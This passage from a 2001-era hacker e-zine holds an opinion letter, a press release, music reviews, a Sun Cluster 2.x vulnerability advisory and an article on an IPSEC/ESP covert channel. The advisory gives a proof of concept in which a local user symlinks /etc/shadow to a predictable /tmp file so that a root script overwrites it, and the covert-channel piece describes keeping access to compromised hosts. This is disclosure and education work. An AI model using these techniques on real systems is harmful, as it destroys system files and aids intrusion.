+  The next thing you would have to do to make your executable even smaller
+is learn more about the ELF format. To see how that is done look at
+
+http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html
+
+That site is where I learned everything I wanted to know about making
+executables small.
+
+For comments, suggestions,, and even complaints you can reach me at
+orbitz@firest0rm.org
+
+_________________________________________________________________
+--------------------------------------------------------- - kynik
+[=] 0x05: Hacker 'Zines and Information Security Magazine
+
+The December issue of Information Security Magazine posed the following
+question to its readers in its "Talk Back" section:
+
+"Are hacker zines (2600, Phrack) and Web sites (HNN, attrition.org,
+Rootshell) worthwhile educational resources for infosec professionals, or
+do they ultimately cause more harm than good?"
+
+Here's the reply I sent, since I obviously have a strong opinion on the
+subject:
+
+
+I was somewhat shocked by this question, as I had always considered the
+high-profile 'hacker' sites (HNN, Packetstorm) as valuable tools, and
+sites I make it a point to visit daily. It just seemed obvious that
+anyone would want a different perspective on the aspects of their job, as
+well as potentially cutting-edge information. Also keep in mind that many
+of these 'hacker' sites are owned by security-oriented companies, and not
+necessarily John Q Hacker living in the garage. The material there is
+from similar infosec professionals you know and love during the day, but
+perhaps without an editor or boss peeking over their shoulders when
+deadlines approach. Some amazing work has come out of solo at-home
+innovation by regular 9-to-5ers. Believe me, I've seen it. I think the
+problem that many 'professionals' may have is that the tone on many of
+these sites are not what they're used to in 'regular' print magazines,
+without ads and without most of the censorship.
+
+I run my own security-oriented zine called Napalm (napalm.firest0rm.org)
+and unlike many other zines out there, try to keep the tone more
+professional, with actual grammar and spelling checks, and little or no
+profanity or childish 'shout outs'. Sure, we try to take a humorous
+approach sometimes, but I think more people need that than another dry
+article on firewalls. We also give the article contributors an
+opportunity to comment on other articles in the same issue, to pose
+questions, comments, or clarifications to the material. There's very
+little hacker-specific material in the zine that might scare away
+non-'hackers'. We've even been referred to by the folks at OpenBSD for
+anybody looking to work with IPSEC and that particular OS.
+
+Separating the childish/politically slanted element from many of these
+zines and websites can be annoying and some may claim that it's not worth
+it. I ask you to simply read the material that is out there, ignoring the
+chattering from the peanut gallery and make a judgement on a case-by-case
+basis. Phrack, Napalm, and HNN are each their own entity, and have their
+own strengths and weaknesses (or corporate backers, as the case may be).
+Shutting your mind to a source of information just doesn't make sense to
+me, especially in a field where information and proactivity is so
+essential.
+
+
+Kynik
+editor, Napalm e-zine
+http://napalm.firest0rm.org/
+
+_________________________________________________________
+------------------------------------------- - Thomas Icom
+[=] 0x06: Press Release: Cybertech Magazine
+
+FOR IMMEDIATE RELEASE:
+Contact: Thomas Icom, editor <ticom@iirg.org>
+Subject: Cybertech is back!
+
+Cybertech: The Cyberpunk Technical Journal (since 1990) is now back in
+full swing! Cybertech, famous for containing both high tech and low
+tech information, has received rave reviews from well-known periodicals
+such as Full Disclosure, Factsheet Five, Wired, and Iron Feather
+Journal. Jerod Pore from Wired/Factsheet Five called Cybertech "2600
+recombined with The Poor Man's James Bond...*the* sourcezine for
+survivalist-hackers." (FF5,#57, Wired 2.01).
+
+Cybertech features old-school writers such as Brian Oblivion (formerly
+of the l0pht, now doing wireless network experimentation at
+guerilla.net), Bootleg (former editor of the 1980s hacking zine "The
+Bootlegger"), and the members of The International Information
+Retreival Guild (publishers of Phantasy hacking/survival e-zine at
+http://www.iirg.org/phantasy.html ).
+
+Samples are $3. Subscriptions are $12/year (published quarterly) sent
+to:
+
+Cybertech
+P.O. Box 641
+Marion, CT 06444
+
+For more info, and free samples of articles from back issues visit our
+web site at http://www.iirg.org/~ticom/
+
+_______________________________________________
+--------------------------------------- - echo8
+[=] 0x07: More Holes in Sun Cluster 2.x
+
+  I never intended to write about Sun Cluster more than once, but as I 
+continued messing with product, I continued to find more vulnerability.
+Readers should draw their own conclusions based upon the security 
+requirements of their installations, but I'd personally think twice
+before paying a lot of money for this software...
+
+Summary
+-------
+
+  Several Sun Cluster components create and manipulate temporary files in
+insecure ways. Some occurences of this problem can lead to a local denial
+of service, as they can allow local users to overwrite arbitrary files. 
+
+Specifics
+---------
+
+  Several Sun Cluster application programs create files in a
+world-writeable directory (/tmp) with predictable filenames without
+checking first for the existence of the target file, or whether or not
+the target is a symbolic link. This behavior can trivially be exploited
+by local users in order to deny service by overwriting arbitrary files
+(these utilities all run as root). Some examples:
+
+From nfs_fix_sharetab: 
+
+awk '(NF < 4 )' $fname > /tmp/awk.output
+log_info "SUNWcluster.hanfs.3050" "File $fname contains some garbage
+lines, deleting them."
+awk '(NF >= 4)' $fname > $newfname
+cp $newfname $fname
+rm -f /tmp/awk.output $newfname
+sync >/dev/null 2>&1 &
+exit 0
+
+  As /tmp is world-writeable, any local user can symbolically link
+/tmp/awk.output to any file they wish to overwrite. When nfs_fix_sharetab
+runs, the target file will be destroyed. 
+
+lookuphost has the same problem: 
+
+egrep '^[^#]*[   ]'${hostname}'[         ]|^[^#]*[       ]'${hostname}'$' \
+ < /etc/hosts > ${tmpdir}/egrep.host 2> /dev/null
+if [[ $? -eq 0 && -s ${tmpdir}/egrep.host ]]; then
+  let lines="`wc -l < ${tmpdir}/egrep.host`"
+  if (( lines == 1 )); then
+    awk '{print $1}' < ${tmpdir}/egrep.host
+  elif (( lines > 1 )); then
+    # More than one occurrence in /etc/hosts.  
+    # Use first entry, and warn the administrator
+    answer=$(awk '{print $1; exit}' < ${tmpdir}/egrep.host)
+    log_info "${pre}.3010" "/etc/hosts has multiple entries for ${hostname}"
+    print ${answer}
+    /bin/rm -f ${tmpdir}/egrep.host
+    exit 2
+  fi
+
+This problem also occurs several times in scconf itself. One example: 
+
+if [ $? -ne 0 ]; then
+    LC_ALL=C /usr/sbin/vxassist -g ${dg} -U fsgen make ${dg}-stat 2m \
+     > /dev/null 2> /tmp/vxassist.out
+    if [ $? -ne 0 ]; then
+      LC_ALL=C
+      lmsg="`gettext \
+        'vxassist failed to create %s-stat volume on %s diskgroup'`"
+      printf "${lmsg}\n" "${dg}" "${dg}"
+      if [ -f /tmp/vxassist.out ]; then
+        /bin/grep "Cannot allocate space" /tmp/vxassist.out > /dev/null
+        if [ $? -eq 0 ]; then
+          lmsg="`gettext '\n\
+        Unable to allocate space to create mirrored volume for\n\
+        administrative file system in diskgroup %s. 4MB of free disk\n\
+        space needs to be present in %s for this purpose to configure\n\
+        for HA-NFS.'`"
+          printf "${lmsg}\n" "${dg}" "${dg}"
+        else
+          /bin/cat /tmp/vxassist.out
+        fi
+        /bin/rm -f /tmp/vxassist.out
+    fi
+      return 1
+    else
+...
+
+Finally, scinstall has similar issues. An example:
+
+ if [ -z "${tokenCK}" ]; then
+                        if (( VERBOSE == 1 )); then
+                            print "Adding the DS_SUN format to the ccd..."
+                        fi
+                        # add the DS_SUN format to the ccd.database file
+                        CCDDSSUNFILE=/tmp/dssun.ccd
+                        /bin/cat >> ${CCDDSSUNFILE} << EOF
+
+...
+
+There are MANY such problems to be found in the various Sun Cluster shell
+scripts.
+
+  It's also the case that there are MANY instances in which the temporary
+file is not specifically named, but has a name which will be easily
+predictable (in the format /tmp/filename.$$). Attacking these files would
+be more difficult as an attacker would have to successfully guess the PID
+that will be used by the offending code (several examples exist that prove
+that this can be done), and such an attacker would have to have some
+reasonable idea regarding when the superuser will invoke the utilities in
+question. Numerous Sun Cluster utilities have this problem; I have not
+listed them all here.
+
+  I have NOT attempted any sort of comprehensive audit of Sun Cluster. In
+this case, a recent thread on Bugtraq highlighted the potential problems
+caused by poor handling of temporary files. I was really looking
+specifically for that class of problem. I also lack access to Sun Cluster
+source. All of these holes were found just by reading through the code
+for the components which are distributed as shell scripts. 
+
+Proof of Concept
+----------------
+
+A sample exploit. To use lookuphost to severely damage a system, an
+unprivileged user could do the following: 
+
+$ id
+uid=1997(foo) gid=25(programmers)
+$ ln -s /etc/shadow /usr/tmp/egrep.host
+$ ls -alt /usr/tmp/egrep.host
+lrwxrwxrwx 1 foo programmers 11 Dec 22 11:12 /usr/tmp/egrep.host -> /etc/shadow
+$ 
+
+... wait for lookuphost to run ...
+
+$ cmp /etc/shadow /etc/hosts
+$
+
+(lookuphost uses its temporary file to store a subset of /etc/hosts,
+which is why, in this example, that's what ends up in /etc/shadow)
+
+Workaround
+----------
+
+None suggested. No patches are currently available. 
+
+Vulnerable Versions
+-------------------
+
+This has been confirmed on Solaris 2.6, running Sun Cluster 2.1 and 2.2. 
+Any OS level running Sun Cluster 2.x is most likely vulnerable. 
+
+Vendor Notification
+-------------------
+
+The vendor was notifed on 12/22/2000. 
+
+Address comments to echo8@gh0st.net.
+
+_________________________________________________________
+-------------------------------------------------- - ajax
+[=] 0x08: Masquerading as IPSEC for Fun and Profit
+
+(or "RFC" is Just a Polite Word for "Covert Channel")
+
+-=:[ .the.backdrop.
+
+  IPSEC is not a protocol. IPSEC is a big towering ugly wump of  
+protocols, all residing at verious levels in the ISO model. Among them
+are ESP and AH, which kinda live in the transport layer; and ISAKMP,
+Photuris, SKIP, DNSSEC, and any other key-exchange protocols, which are
+themselves finished (hah!) applications, but which get invoked at the
+session layer and enable functionality at the transport layer. Kinda.
+Suffice to say, the design as it now stands is big and ugly.
+
+-=:[ .the.scene.
+
+  ESP and AH, the actual encrypted and/or authenticated transport
+protocols, are however themselves quite simple. An ESP packet looks like:
+
+SPI (32-bit number) [1]
+Sequence number (32-bit number)
+Encrypted Payload (variable) containing:
+  Next Packet (variable)
+  Padding (0-255 bytes)
+  Pad Length (8-bit number)
+  Next Header (8-bit number)
+Authentication Data (variable and optional)
+
+An AH packet looks like:
+
+Next Header (8-bit number)
+Payload Length (8-bit number)
+Reserved (16 bits of zeros. Don't ask.)
+SPI (32-bit number)
+Sequence number (32-bit number)
+Authentication Data (variable)
+(and then the auth'd packet)
+
+  This is really all self-explanatory stuff, except maybe for the
+sequence number. It must be present, it must start at 1 for each
+different SPI, and (if the two hosts involved so agree) before the
+2^32'nd packet transmitted with that SPI, something has to establish a
+new SA for the two hosts to use. It thus enables anti-replay protection.
+Now why it has to be present in _all_ packets, and why it has to start
+from one instead of some random value that could be decided upon at SA
+negotiation time, is unclear, but it won't give us much trouble.
+
+-=:[ .the.crime.
+
+It turns out, this gives us a big shiny covert channel.
+
+  "Covert channel" sounds scary, conjuring images of spies and secret
+missions and the government will deny all knowledge and so forth. In
+reality, it's just a message being extracted from a data sequence in
+something other than the expected way.  httptunnel is a covert channel.
+Loki is a covert channel. Steganography is a covert channel. The
+abomination that is MS's SOAP is a covert channel.
+
+  Covert channels are the kind of things that firewall vendors hate,
+because they mean you have to do stateful inspection on the data stream
+to see if it's behaving like a good non-covert channel, and that's
+_hard_, and even then you aren't sure. Suppose I set up my firewall to
+only allow port 80 inbound; well, if my webserver gets compromised, I
+could just send a magic header field to it and have it spawn a shell for
+me, which would a) not be the way HTTP is expected to act and b) defeat
+the purpose of filtering out telnet traffic at the firewall.
+
+  I think firewalls are dumb, because they promote laziness and make it
+okay to "get away with" otherwise insecure things inside the firewall.
+So let's play, shall we?
+
+  Let's say we have control of some box inside the firewall, and we can
+get ESP traffic to it. Well, "ESP traffic" really means "IP packets with
+the next header field set to 50". Well, now, if we were a firewall, what
+fields does ESP give us that we could filter? We can't filter based on
+anything in the encrypted payload, because it's (ostensibly) encrypted
+and thus (to the firewall) gibberish. We can't filter based on the
+authentication data, because we a) are not guaranteed that it be present,
+b) don't know the hash algorithm being used, and c) don't know the key
+used with the hash algorithm. We also can't expect anything about the
+size or alignedness of the packet.
+
+  We're left with SPI and sequence number. The SPI is supposed to be a
+random number for each SA the two hosts negotiate, so we can't expect it
+to be predictable. However, for each SPI, the sequence number has to
+start at 1, thank you RFC2406. Easy enough. Let's build a packet:
+
+[ IP header | next = 50 ]
+[ random number ]
+[ 1 ]
+[ our payload ]
+
+  That's it. If the firewall lets ESP through to the destination host at
+all, then we have acheived an unfilterable covert channel.
+
+-=:[ .the.tension.
+
+  What's this mean? Well, remember, covert channels require some extra
+code on both ends, so we're assuming something compromised inside the
+firewall. I now have an unfiltered data stream to a compromised host. I
+could sniff your network, use the compromised machine as a bounce point
+to other places in your network, any number of sneaky things. End-to-end
+ESP thus requires secure ends. If you're doing net-to-net ESP, you
+probably don't want to allow ESP traffic to or from anything but the ESP
+gateway.
+
+  Is this a new problem? No. Clearly. But it reinforces the case for not
+relying on firewalls for your security. It's impossible to secure a
+network without actually securing the machines on it.
+
+-=:[ .the.revelation.
+
+  You know what'd be really cool? A kernel module and preloadable .so
+combo that would do this for you automatically. It's a real shame that I
+don't have it done yet. But you'll live. Check in on http://firest0rm.org/
+for a release notice.
+
+[ Real Soon Now, I hope. I'm interested {kynik} ]
+
+-=:[ .authors.notes.
+
+[1] - "SPI" stands for security parameters index. The kernel maintains a
+database of mappings from SPI numbers to their associated encryption and
+authentication algorithms and keying material for each.
+
+[2] - "SA" stands for security association, and "an SA" means "an SPI and
+associated settings".
+
+- (c) 2001 ajax <ajax@firest0rm.org>
+
+___________________________________________
+----------------------- - kynik, ajax, gwen
+[=] 0x09: Music Reviews
+
+Though I receieved several offers to assist in doing music reviews, I only
+actually received one completed review, which you will find below with my
+own and ajax's. From now on, this section will be my place (and any of
+the other core contributors) to review anything I feel like. So, instead
+of you doing any reviews, send me suggestions for things to review, and
+I'll do 5 or 6 of them per issue.
+
+Now, down to brass tacks. The first song is from a band I'm friends with
+called Condition 1. You can find them at:
+
+http://www.condition1.com/
+
+The song is "Never Again":
+
+gwen's Review
+---------------
+Originality - 2.0
+Talent      - 3.5
+Production  - 4.0
+I Like It   - 2.0
+
+  Metal's just not my thing - but this seems to be a pretty decent
+example of it's genre. Snarling guitar, straightforward drums, with an
+odd tinkle of cowbells. The singer's surprisingly melodic for screaming
+metal - not quite howls of agony. Suprisingly robust, with undertones of
+melody. Not destined for my cellar, but sure to please the palettes of
+some.
+
+kynik's Review
+----------------
+Originality - 2.5
+Talent      - 4.0
+Production  - 3.5
+I Like It   - 4.0
+
+Oh, what Metallica should have been. If Metallica hadn't got sucked into
+the pop music market, this is probably what they would have sounded like.
+Aggressive vocals, yet still melodic; thundering bass; kick-out-your-teeth
+guitar; and drums that remind you that all Lars plays anymore is slow
+4-beat crap. Yes, I've seen these guys many times, and they do the odd
+Metallica covers, but they are certainly their own band. In this song, for
+example, the 7-string guitar and the 5-string (custom!) bass really shine
+through. Good luck to them on getting their tour van fixed!
+
+ajax's Review
+----------------
+Originality - 3.0
+Talent      - 4.0
+Production  - 3.0
+I Like It   - 3.5
+
+Pretty much straight up metal here. Not bad, not bad at all, but you've 
+heard it. As with most metal bands, the drummer and bassist are crucial, 
+and Condition 1 has a good pair. The singer actually has some melody 
+here, which is good, but the delay on his voice maybe echoes a little 
+loud. Actually, no, I take that back. The guitarist is pretty generic, 
+though, which is a shame; with either a little better lead line or a 
+little better production he could sound really good. But it's a fun hook 
+and a good backbeat, something to blast out the car stereo in picket-fence 
+neighborhoods.
+
+
+The next song is from a band called Man(i)kin. You can find them at:
+
+http://www.manikin.force9.co.uk/
+
+The song is called "Deity":
+
+ajax's Review
+----------------
+Originality - 3.5
+Talent      - 3.5
+Production  - 2.0
+I Like It   - 3.5
+
+Okay. I know the ridiculously heavy distortion on the instruments and the 
+vocals is intentional. I'm aware of industrial. But, no. There a right 
+way and a wrong way to do distortion, especially on vocals, and this was 
+the wrong way. It actually sounds more like they hooked up a white noise 
+generator to a talkbox. But at least the drumkit and the synth line are 
+well programmed, if nothing earth-shattering. I could see this song being 
+an excellent candidate for a remix, maybe a nice breakbeat under it 
+instead of the idiot-house kick drum beat. If industrial's your thing, 
+you'll like this, but if it's not, it won't convert you.
+
+gwen's Review
+----------------
+Originality - 2.0
+Talent      - 2.9
+Production  - 2.0
+I Like It   - 2.5
+
+I liked this song a lot better the first time I heard it. On repeat, it
+sounds like the Trent Reznor angst generation. The hiss leaves me
+thinking of bootleg audio. To give the lead singer credit, he's got
+excellent enunciation - although that doesn't entirely fit the style of
+the song. All in all - I'd dance to it - don't know that I'd keep it.
+ 
+kynik's Review
+---------------
+Originality - 2.0
+Talent      - 1.5
+Production  - 3.0
+I Like It   - 1.5
+
+Unfortunately, this sounds like oh-so-many other 'goth' or 'industrial' 
+bands out there. A huge pet peeve of mine when it comes to music is 
+overused vocal effects. Being a vocalist, it irks me to no end when you 
+can't really tell what the vocalist's voice sounds like. The sound is 
+probably the redeeming factor for the song, since it was put together 
+quite well, despite the bland not-much-bass 'thump-thump' this consists 
+of. 
+
+Overall Rating, "Never Again"
+-------------------------
+Originality - 2.50
+Talent      - 3.83
+Production  - 3.50
+I Like It   - 3.17
+Total       - 13.00/20.00 (65.00%)
+
+Overall Rating, "Deity"
+-------------------------
+Originality - 2.50
+Talent      - 2.63
+Production  - 2.33
+I Like It   - 2.50
+Total       - 9.96/20.00 (49.80%)
+
+_________________
+-----------------
+[=] 0x0A: Credits
+
+               Editor:  Kynik    <kynik@firest0rm.org>
+            Co-Editor:  ajax     <ajax@firest0rm.org>
+Article Contributions:  ticom    <ticom@iirg.org>
+                        _azure   <azure@gh0st.net>
+                        orbitz   <orbitz@firest0rm.org>
+                        echo8    <echo8@gh0st.net>
+        Music Reviews:  gwen     <gwen@reptiles.org>
+
+To subscribe to this 'zine:
+  email napalm@firest0rm.org with a subject of SUBSCRIBE
+
+To unsubscribe:
+  email napalm@firest0rm.org with a subject of UNSUBSCRIBE
+
+Or find us online at:
+  http://napalm.firest0rm.org/
+
+Submissions, questions, comments, and constructive chaos may also be
+directed to kynik@firest0rm.org or any of the contributors
+
+.n9! - eof
+
+
